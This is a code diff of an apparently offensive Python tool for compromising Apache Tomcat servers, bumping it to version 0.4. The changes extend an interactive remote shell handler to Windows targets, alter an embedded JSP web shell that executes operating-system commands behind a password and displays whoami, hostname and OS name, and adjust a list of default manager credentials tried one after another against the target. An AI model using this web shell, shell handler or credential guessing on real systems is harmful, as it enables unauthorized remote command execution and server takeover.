@@ -42,7 +42,7 @@ import mechanize
 import threading
 import subprocess
 
-VERSION = '0.3.4'
+VERSION = '0.4'
 
 RECVSIZE = 8192
 SHELLEVENT = threading.Event()
@@ -67,18 +67,65 @@ ssl._create_default_https_context = ssl._create_unverified_context
 class MissingDependencyError(Exception):
     pass
 
-def shellLoop(sock):
+def recvall(sock):
+    res = sock.recv(RECVSIZE)
+    sock.settimeout(1.0)
     try:
-        sock.send('whoami\n')
-        whoami = sock.recv(RECVSIZE).strip()
-        sock.send('hostname\n')
-        hostname = sock.recv(RECVSIZE).strip()
+        chunk = ''
+        while True:
+            chunk = sock.recv(1)
+            if not chunk: break
+            res += chunk
+    except:
+        pass
+
+    sock.settimeout(None)
+    return res
+    
+def issueCommand(sock, cmd, isWindows):
+    if isWindows:
+        cmd = cmd + '\r\n'
+    else:
+        cmd = cmd + '\n'
+
+    sock.send(cmd)
+    res = recvall(sock).strip()
+
+    if isWindows:
+        res = res.replace(cmd, '')
+        lines = res.split('\r\n')
+
+        if len(lines) > 2 and lines[-2].strip() == '' \
+            and re.match(r'[A-Z]\:(?:\\[^>]+)>', lines[-1]):
+            res = '\r\n'.join(lines[:-2])
+
+    return res
+
+def shellLoop(sock, host):
+    isWindows = False
+    initialRecv = ''
+    try:
+        try:
+            sock.settimeout(1.0)
+            initialRecv = recvall(sock)
+            sock.settimeout(None)
+        except: 
+            pass
+
+        if 'Microsoft Windows [Version' in initialRecv:
+            lines = initialRecv.split('\r\n')
+            path = lines[-1]
+            isWindows = True
+
+        whoami = issueCommand(sock, 'whoami', isWindows)
+        hostname = issueCommand(sock, 'hostname', isWindows)
+
     except (socket.gaierror, socket.error) as e:
         logger.error(
             "Initial commands could not be executed. Something is wrong.\n\tError: '%s'" % e)
         return False
 
-    logger.debug('Connected with the shell: %s@%s' % (whoami, hostname))
+    logger.info('Connected with: %s@%s' % (whoami, hostname))
     sock.settimeout(0)
     sock.setblocking(1)
     SHELLSTATUS.set()
@@ -88,20 +135,25 @@ def shellLoop(sock):
     if len(hostname) == 0:
         hostname = host
 
+    prompt = "\n%s@%s $ " % (whoami, hostname)
+    if isWindows:
+        prompt = "\r\n%s " % path
+
+    prompt = "\033[0;34m%s\033[1;0m" % prompt
+
     try:
         while True:
-            command = raw_input("\n%s@%s $ " % (whoami, hostname))
+            command = raw_input(prompt)
             if not command:
                 continue
             if command.lower() == 'exit' or command.lower() == 'quit':
                 break
 
-            sock.send(command + '\n')
-            res = sock.recv(RECVSIZE).strip()
+            res = issueCommand(sock, command, isWindows)
 
             if not len(res) and len(command):
-                if serv:
-                    serv.close()
+                if sock:
+                    sock.close()
                 break
 
             print(res)
@@ -148,7 +200,7 @@ def shellHandler(mode, hostn, opts):
             sock.close()
             return False
 
-    shellLoop(sock)
+    shellLoop(sock, host)
     sock.close()
     if serv:
         serv.close()
@@ -426,7 +478,11 @@ def preparePayload(opts):
 			return "Wrong password or no command issued.";
 		}
 
-		return res.toString();
+		String out = res.toString();
+                if (out != null && out.length() > 5 && out.indexOf("<br/>") != -1) { 
+                    out = out.substring(0, out.length() - 5);
+                }
+                return out;
 	}
 %%><!DOCTYPE html>
 <html>
@@ -442,11 +498,16 @@ def preparePayload(opts):
 		<hr/>
 		<form method=post>
 		<table style="width:100%%">
+                        <tr>
+                                <td>OS:</td><td style="width:100%%">
+                                    <%% out.print(System.getProperty("os.name")); %%>
+                                </td>
+                        </tr>
 			<tr>
-				<td>Password:</td><td style="width:100%%"><input type=password width=40 name="password" value='<%% out.print((request.getParameter("password") != null) ? request.getParameter("password") : ""); %%>' /></td>
+				<td><b style="color:red">Password:</b></td><td style="width:100%%"><input type=password width=40 name="password" value='<%% out.print((request.getParameter("password") != null) ? request.getParameter("password") : ""); %%>' /></td>
 			</tr>
 			<tr>
-				<td>tomcat $ </td><td style="width:100%%"><input type=text size=100 name="cmd" value='<%% out.print((request.getParameter("cmd") != null) ? request.getParameter("cmd") : "uname -a"); %%>' onClick="this.select();" onkeydown="if (event.keyCode == 13) { this.form.submit(); return false; }" /></td>
+				<td><b style="color:blue"><%% out.print(execute("%(password)s", "whoami") + "@" + execute("%(password)s", "hostname"));%%></b></td><td style="width:100%%"><input type=text size=100 name="cmd" value='<%% out.print((request.getParameter("cmd") != null) ? request.getParameter("cmd") : "uname -a"); %%>' onClick="this.select();" onkeydown="if (event.keyCode == 13) { this.form.submit(); return false; }" /></td>
 			</tr>
 			<tr>
 				<td><input type=submit style="position:absolute;left:-9999px;width:1px;height:1px;" tabindex="-1"/></td><td></td>
@@ -822,12 +883,13 @@ def main():
 
     userPasswordPairs = (
         ('tomcat', 'tomcat'),
-        ('admin', ''),
         ('admin', 'admin'),
+        ('admin', ''),
         ('cxuser', 'cxuser'),
         ('j2deployer', 'j2deployer'),
         ('ovwebusr', 'OvW*busr1'),
         ('vcx', 'vcx'),
+        ('', ''),
     )
 
     if not opts.generate:
@@ -839,6 +901,8 @@ def main():
                         args[0], opts.url, user, password)
                     if browser == 403 and url == 403:
                         browser = url = None
+
+                    if browser and url: break
 
                 except KeyboardInterrupt:
                     logger.info(
